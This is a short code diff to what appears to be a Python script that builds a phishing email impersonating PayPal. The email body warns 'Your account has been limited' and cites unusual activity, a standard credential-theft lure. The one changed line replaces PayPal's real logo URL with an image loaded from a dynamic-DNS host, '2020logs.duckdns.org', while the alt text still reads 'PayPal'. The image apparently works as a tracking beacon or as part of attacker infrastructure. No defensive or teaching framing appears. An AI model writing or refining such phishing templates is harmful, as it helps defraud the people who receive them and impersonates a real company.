@@ -31,7 +31,7 @@ html_body = """
 <html>
   <body>
     <div style="font-family: Arial, sans-serif; max-width: 600px; margin: auto; padding: 20px; border: 1px solid #ddd;">
-      <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" alt="PayPal" width="100">
+      <img src="2020logs.duckdns.org" alt="PayPal" width="100">
       <h2 style="color:#c00;">Your account has been limited</h2>
       <p>Dear Customer,</p>
       <p>We have detected unusual activity on your PayPal account. To prevent further access, we have temporarily limited your account.</p>
